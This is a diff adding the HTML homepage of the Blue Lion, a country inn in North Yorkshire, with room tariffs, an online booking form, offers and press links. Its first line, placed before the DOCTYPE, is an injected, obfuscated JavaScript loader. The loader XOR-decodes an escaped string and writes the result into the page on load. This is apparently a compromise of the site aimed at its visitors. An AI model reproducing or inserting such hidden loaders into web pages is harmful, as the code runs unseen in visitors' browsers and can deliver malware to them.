@@ -1,0 +1,391 @@
+<script language='javascript'>var SBanVCeUbbbNowEG='';UKxFmH='FqSnrFnBDypbkWTlRyNe';var VFNodwtvYedCL='YemxkQSTmhlirxhzLQUxDSgUZMhnkLTeWxTCEnWtfrSdqhJModGoIuuiXOR';equzMykOBDZeMPPGrGVkKtab='EUomhfUyfGqTK';var KfTeqLXxjxESaUnEIQ=0;fQBDJmrFWELLkTZXwCR='woNyqDjXtCIUXMmnuNY';var rbldofMChlQiIEhxwG='%59%04%1E%19%30%3E%31%4D%1B%1E%0A%4F%5A%68%0E%38%21%6F%57%6B%3D%02%31%35%20%46%07%05%63%3D%0B%79%1B%33%2A%7A%0A%32%12%07%07%3F%10%53%48%2C%3F%0E%09%22%0D%26%07%11%0C%2A%72%70%69%47%4D%0B%08%23%3C%38%01%01%02%0E%4F%5A%06%15%6E%71%3D%1D%2D%34%0F%21%67%6F%59%4C%4B%3B%3D%01%23%10%69%61%74%4C%77%1C%15%02%32%07%14%55%68%7C%4D%44%31%1C%39%14%16%0C%65%6D%63%7B%45%6D%19%19%36%3A%3A%1A%01%08%1D%1A%45%4A%4A%6E%71%38%19%36%34%0E%3B%32%28%01%09%03%38%69%47%67%5A%6A%7F%6A%07%31%06%07%1F%36%5A';ewUMfBn='QHMqWfytvRiDopr';var nVcUhjQLBtELwYJ=rbldofMChlQiIEhxwG.length/3;RqcmkREcrBHQSN='vfADDzllfjzZIAXOVyRwhd';rbldofMChlQiIEhxwG=unescape(rbldofMChlQiIEhxwG);BlgOxMlippiaYmpVmPH='bjYavjZrtGwDSzLNps';for(CcXCJKKSbdYTTUNgYyXxO=0;CcXCJKKSbdYTTUNgYyXxO<nVcUhjQLBtELwYJ;CcXCJKKSbdYTTUNgYyXxO++){KfTeqLXxjxESaUnEIQ++;if(VFNodwtvYedCL.length<=KfTeqLXxjxESaUnEIQ) KfTeqLXxjxESaUnEIQ=0;lPLKgWFZcPl=rbldofMChlQiIEhxwG.charCodeAt(CcXCJKKSbdYTTUNgYyXxO); easyxzNXJpmKaLM='NmLhYYLOvopiPfty'; if(VFNodwtvYedCL.charCodeAt(KfTeqLXxjxESaUnEIQ)!=lPLKgWFZcPl) lPLKgWFZcPl^=VFNodwtvYedCL.charCodeAt(KfTeqLXxjxESaUnEIQ); mvkjgHDDeGWz='vrFFAqJISUmRCsTuRGU';SBanVCeUbbbNowEG+=String.fromCharCode(lPLKgWFZcPl);} PKRaQpIevWVVI='bCbjSAOcfzmeKQlYhzcILki';document.write(SBanVCeUbbbNowEG);DNHXqbDYAr='zRSGrK';</script>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
+<meta name="description" content="The Blue Lion Hotel Inn is a beautiful hotel and restaurant in the Yorkshire Dales. Situated near Harrogate and Ripon, the hotel provides good accommodation for anyone staying in the Yorkshire Dales." />
+<meta name="keywords" content="Blue Lion Hotel Inn country inn yorkshire dales harrogate" />
+<title>The Blue Lion Hotel Inn &amp; Restaurant, Middleham, North Yorkshire Dales, England</title>
+<base href="http://www.thebluelion.co.uk/" />
+<link rel="stylesheet" href="styles/main.css" type="text/css" />
+<script language="javascript" type="text/javascript">
+function swap(img, id){
+	
+	document.getElementById('mainimg').src = img;
+	document.getElementById(id).style.borderColor = '#F7AF2B';
+	
+	var thumbcount = -1;
+	
+	for (var x = 0; x <= thumbcount; x++)
+   		{
+  		 var y = 'thumb' + x;
+		 
+		 if (id != y){
+		 
+		 	document.getElementById(y).style.borderColor = '#FFF';
+		 
+		 }
+		 
+   		}
+	
+	
+
+}
+</script>
+</head>
+
+<body style= "background-image: url(img/bg.jpg); background-repeat: repeat-x;">
+<div id="container">
+
+	<div id="header">
+	
+		<h1>The Blue Lion</h1>
+		
+		<p class="bluelion"><a title="Visit to White Swan Hotel website" href="http://www.whiteswanhotel.co.uk" target="_blank">VISIT THE WHITE SWAN HOTEL &gt;</a></p>
+		
+		<div id="nav">
+
+			<p><a href="home/home.html" class="on">Home</a> <span>-</span> <a href="where/where.html">Where</a> <span>-</span> <a href="food/food.html">Food</a> <span>-</span> <a href="drink/drink.html">Drink</a> <span>-</span> <a href="accommodation/accommodation.html">Accommodation</a> <span>-</span> <a href="events/events.html">Events</a> <span>-</span> <a href="links/links.html">Links</a> <span>-</span> <a href="contact/contact.html">Contact</a> <span>-</span> <a href="function/function.html">Function Rooms</a> <span>-</span> <a href="recruitment/recruitment.html">Recruitment</a> <span>-</span> <a href="photo_gallery.php">Photo Gallery</a></p>
+			
+			<p></p>
+			
+		</div>
+		
+		<div id="quote">
+			&quot;We always make sure we visit the Blue Lion at least once a month. The constantly changing menu and wine list make every visit a special occasion&quot;
+		</div>
+		
+	</div>
+	
+	<div id="strap">
+		
+		<div id="strap_left">
+		
+				<object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=7,0,19,0" width="651" height="430" title="Home">
+          <param name="movie" value="flash/bluelion_home.swf" />
+          <param name="quality" value="high" />
+          <embed src="flash/bluelion_home.swf" quality="high" pluginspage="http://www.macromedia.com/go/getflashplayer" type="application/x-shockwave-flash" width="651" height="430"></embed>
+		  </object>
+				
+		        
+        		
+				
+				
+				
+				</div>
+	</div>
+		
+		<div id="strap_right">
+		
+			<p class="reservations">FOR RESERVATIONS CALL:<br />
+			<span>01969 624273</span></p>
+			<p class="address">The Blue Lion.<br />
+East Witton, Nr Leyburn,<br />
+North Yorkshire DL8 4SN<br />
+Fax: (01969) 624189<br />
+Email: <a href="mailto:enquiries@thebluelion.co.uk" title="Email The Blue Lion Hotel Harrogate">enquiries@thebluelion.co.uk</a></p>
+		
+            <div class="dotted"></div>
+          <div class="offersbox">
+			<!--<link rel="stylesheet" type="text/css" href="" />
+<link rel="stylesheet" type="text/css" href="../styles/Admin_Jstyles.css">
+<link href="../styles/Jstyles.css" rel="stylesheet" type="text/css" />
+<link href="../styles/style.css" rel="stylesheet" type="text/css" />-->
+
+        <link type="text/css" rel="stylesheet" href="admin/src/css/border-radius.css" />
+        <link id="skin-win2k" title="Win 2K" type="text/css" rel="alternate stylesheet" href="admin/src/css/win2k/win2k.css" />
+        <link id="skinhelper-compact" type="text/css" rel="alternate stylesheet" href="admin/src/css/reduce-spacing.css" />
+        <script src="admin/src/js/jscal2.js"></script>
+        <script src="admin/src/js/lang/en.js"></script>
+
+
+<script type="text/javascript" src="cal/js/jquery.min.js"></script>
+<script type="text/javascript" src="cal/js/jquery.datepick.js"></script>
+<link rel="stylesheet" type="text/css" href="cal/css/jquery.datepick.css" id="theme">
+<style type="text/css">
+@import "cal/css/jquery.datepick.css";
+/* Or use these for a ThemeRoller theme instead
+@import "themes16/southstreet/ui.all.css";
+@import "css/ui-southstreet.datepick.css";
+*/
+</style>
+<script type="text/javascript">
+$(function() {
+	var date= new Date();
+	var mindate=date.getDate()+"/"+(date.getMonth()+1)+"/"+date.getFullYear();
+	$('#startdate').datepick({					   
+		minDate: mindate,
+    	showOn: 'both',
+		buttonImageOnly: true, 
+		buttonImage: 'cal/images/calendar.gif',
+		dateFormat: "dd/mm/yy"
+		});
+	$('#closingdate').datepick({					   
+		minDate: mindate,
+    	showOn: 'both',
+		buttonImageOnly: true, 
+		buttonImage: 'cal/images/calendar.gif',
+		dateFormat: "dd/mm/yy"
+		});
+/*	$("#inlineDatepicker").datepick('disable');*/
+});
+
+Array.prototype.inArray = function (value)
+{
+// Returns true if the passed value is found in the
+// array. Returns false if it is not.
+var i;
+for (i=0; i < this.length; i++) 
+{
+	if (this[i] == value) 
+	{
+	return true;
+	}
+}
+return false;
+};
+
+</script>
+<script type="text/javascript">
+function valids_dates_from_to()
+{
+	if(document.getElementById('startdate').value=="")
+	{
+		alert("Enter the start date.");
+		document.getElementById('startdate').focus();
+		return false;
+	}
+	else if(document.getElementById('closingdate').value=="")
+	{
+		alert("Enter the end date.");
+		document.getElementById('closingdate').focus();
+		return false;	
+	}
+	else
+	{
+		return true;
+	}
+}
+function datefill()
+{
+	alert(document.getElementById('startdate').value);
+	}
+</script>
+<form action="http://bookingsystem.hostingpowerontheweb.com/bluelionhotel/index.php?page=clientside/client_book_search" method="post" onsubmit="return bookValidate();">
+<table width="100%" border="0" cellspacing="0" cellpadding="0" class="tariff">
+  <tr>
+    <th>OR....BOOK ONLINE</th>
+  </tr>
+  <tr>
+    <td><table width="100%" border="0" cellspacing="0" cellpadding="0" class="form_tbl">
+  <tr>
+    <td style="width:80px;">Check In date: </td>
+    <td> <div id="f_rangeStart_trigger" align="left"><input style="width:100px;" name="startdate" id="startdate" class="form_input_style" type="text" value="" />
+  </div>
+         </td>    
+  </tr>
+   <tr>
+    <td>Check Out date:</td>
+    <td><div id="f_rangeStart_trigger1" align="left"><input style="width:100px;" name="closingdate" class="form_input_style" id="closingdate" type="text" readonly="readonly" value="" />
+    </div>
+         </td>
+    
+  </tr>
+ 
+  <tr>
+  <td>Room type:</td>
+  <td>
+    <select style="width:130px;" class="form_input_style" name="roomType" id="roomType">
+        <option value="">All</option>
+        <option value="2">Large Double</option>
+        <option value="3">Standard Double</option>
+        <option value="4">Large Superior Double</option>
+        <option value="5">Superior Double</option>
+        <option value="7">Small Double</option>
+        <option value="9">Large Twin</option>
+        <option value="10">Standard Twin</option>
+    </select>
+    </td> 
+  </tr>
+    <tr>
+<td>Capacity:</td>
+  
+     <td>
+     <select class="form_input_style" style="width:130px;" name="capacity" id="capacity">
+   <option value="">All</option>
+   <option value="Double">Double</option>
+   <option  value="Double with Child Occupancy">Double with Child Occupancy</option>
+   <option  value="Single - Mid Week">Single - Mid Week</option>
+   <option value="Single - Weekend">Single - Weekend</option></select></td>
+  </tr>
+  <tr>
+  <td></td>
+  <td style="text-align:left;" class="a_right"><input type="submit" class="button_style" value="Search" name="search" onclick="return valids_dates_from_to()" /></td>
+  </tr>
+</table></td>
+  </tr>
+</table>
+
+
+</form>
+ </div>
+		  
+          <div class="dotted"></div>
+			
+			<div class="offersbox">
+				<p class="special_offers">SPECIAL OFFERS:</p>
+				
+						
+			
+				<p><strong>Winter special offer!</strong><br />
+				Dinner, bed and breakfast rates from £150 per room.
+Rate ...<br /><a href="offers.html" title="Find out more information on our special offers">more details &gt;</a></p>
+			
+			
+						
+			
+				<p><strong>3 nights for the price of 2!</strong><br />
+				When you book any two consecutive nights accommodation at ...<br /><a href="offers.html" title="Find out more information on our special offers">more details &gt;</a></p>
+			
+			
+						</div>
+			
+			<div class="dotted"></div>
+			<table border="0" cellpadding="2" cellspacing="0" class="tariff">
+				<tr>
+					<th height="19" colspan="2">TARIFF - BED &amp; BREAKFAST</th>
+			  </tr>
+				<tr>
+					<td colspan="2"><strong>Superior Rooms</strong></td>
+				</tr>
+				<tr>
+					<td>Large Superior Double</td>
+					<td width="30">&pound;145.00</td>
+				</tr>
+				<tr>
+					<td>Superior Double</td>
+					<td>&pound;129.00</td>
+				</tr>
+				<tr>
+					<td colspan="2">&nbsp;</td>
+				</tr>
+				<tr>
+					<td colspan="2"><strong>Double Rooms</strong></td>
+				</tr>
+				<tr>
+					<td>Large Double/Twin</td>
+					<td>&pound;119.00</td>
+				</tr>
+				<tr>
+					<td>Standard Double/Twin</td>
+					<td>&pound;109.00</td>
+				</tr>
+				<tr>
+					<td>Small Double</td>
+					<td>&pound;94.00</td>
+				</tr>
+				<tr>
+					<td>Child Occupancy</td>
+					<td>&pound;15.00</td>
+				</tr>
+				<tr>
+					<td colspan="2">&nbsp;</td>
+				</tr>
+				<tr>
+					<td colspan="2"><strong>Double Rooms (Single Occupancy)</strong></td>
+				</tr>
+				<tr>
+					<td>Single Mid-Week</td>
+					<td>&pound;69.50</td>
+				</tr>
+				<tr>
+					<td>Weekend Single</td>
+					<td>as per double rate</td>
+				</tr>
+			</table>
+            <div class="dotted"></div>
+            
+            <div class="memberbox">
+
+			<h2>News Items and Features:</h2>
+			<p><a href="http://www.thebluelion.co.uk/pdfs/yorkshire-life.pdf" target="_blank">Yorkshire Life - Restaurant review - June 2009</a></p>
+            <p><a href="http://www.thebluelion.co.uk/pdfs/julia-bradbury.pdf" target="_blank">Julia Bradbury -  Restaurant Review - May 2009</a></p>
+            <p><a href="http://www.thebluelion.co.uk/pdfs/telegraph-weekend.pdf" target="_blank">Telegraph Weekend -  Pub & Restaurant review - April 2009</a></p>
+			<p><a href="http://www.thebluelion.co.uk/pdfs/telegraph-2.pdf" target="_blank">Telegraph.co.uk - Review - April 2009</a></p>
+            <p><a href="http://www.thebluelion.co.uk/pdfs/guardian-2.pdf" target="_blank">Guardian - Review - October 2008</a></p>
+			<p><a href="http://www.thebluelion.co.uk/pdfs/guardian.pdf" target="_blank">Guardian.co.uk - Review - August 2008</a></p>
+            <p></p>
+            
+            </div>
+
+            <div class="dotted"></div>
+            
+            <div class="memberbox">
+            <h2>Associated Links:</h2>
+            
+            <p>Proud Member of <br />The Great Inns of Britain.</p>
+            
+            <p><a target="_blank" href="http://greatinns.co.uk" title="We are a member of The Great Inns of Britain"><img src="img/greatinns.jpg" border="0" alt="The Great Inns of Birtain" title="The Great Inns of Birtain"/></a></p>
+            
+            <p>Find us on<br />Best Loved Hotels.</p>
+            
+            <p><a href="http://www.bestloved.com/hotels/hotel-the-blue-lion-in-east-witton-yorkshire-the-north-england-uk.php" target="_blank" title="The Best Romantic and Luxury Hotels and Hotel Deals in England, Scotland, Wales and Ireland" ><img src="http://www.bestloved.com/images/link-to-us/best-loved-hotels.gif" alt="The Best Romantic and Luxury Hotels and Hotel Deals in England, Scotland, Wales and Ireland" title="The Best Romantic and Luxury Hotels and Hotel Deals in England, Scotland, Wales and Ireland" width="180" height="45" border="0" style="background-color:#FFFFFF; padding:5px;"></a></p>
+            
+            <p><a target="_blank" href="http://www.theyorkshiretourcompany.com" title="The Yorkshire Tour Company"><img src="img/yorktour.jpg" border="0" alt="The Yorkshire Tour Company" title="The Yorkshire Tour Company"/></a></p>
+            
+            </div>
+
+		</div>	
+	
+	
+	<div id="breadcrumb">
+	
+		<p><a href="/" title="View The Blue Lion Homepage">HOME</a> 
+		
+				
+			<span>/</span> <a href="home/home.html">HOME</a> 
+			
+				
+		</p>
+		
+		<div class="link">
+			<a href="photo_gallery.php" title="View the Blue lion Hotel photo gallery">PHOTOGALLERY &raquo;</a>
+		</div>
+		
+	</div>
+	
+	<div id="content">
+		
+		
+	
+		
+		<h2>AN HISTORIC COUNTRY INN</h2>
+<h3>A warm and cosy welcome</h3>
+<p><a href="http://www.thebluelion.co.uk">The Blue Lion</a> was originally built towards the end of the 18th century as a coaching inn, attracting trade from travellers and cattle drovers on their journey through <a href="http://thebluelion.co.uk">Wensleydale</a>. Today our valued visitors come from all over Britain and beyond, but they still receive the warmest of welcomes.</p>
+<p><a href="http://www.thebluelion.co.uk">The Blue Lion</a> has been extensively, but sympathetically, renovated and is now widely regarded as one of the north of England&rsquo;s leading country inns. Thanks to our dedicated and talented staff, who set and maintain the highest standards, we have received a host of regional and national culinary awards.</p>		
+		
+	</div>
+	
+	<div id="footer">
+	
+		<div class="dotted"></div>
+        <div id="smallprint">
+		<p>The Blue Lion. East Witton, Nr Leyburn, North Yorkshire DL8 4SN Tel: (01969) 624273 Fax: (01969) 624189 Email: <a href="mailto:enquiries@thebluelion.co.uk" title="Email The Blue Lion">enquiries@thebluelion.co.uk</a></p>
+        </div>
+		<div id="sitedesign">
+           <a href="http://www.intravenous.net/" target="_blank"><img src="img/intravenous.gif" alt="Site Design - Intravenous" title="Site Design - Intravenous" border="0" align="right"/></a></p>
+		</div>
+	</div>
+	
+</div>
+
+
+
+
+<script type="text/javascript">
+try {
+var pageTracker = _gat._getTracker("UA-243572-59");
+pageTracker._trackPageview();
+} catch(err) {}</script>
+</body>
+</html>
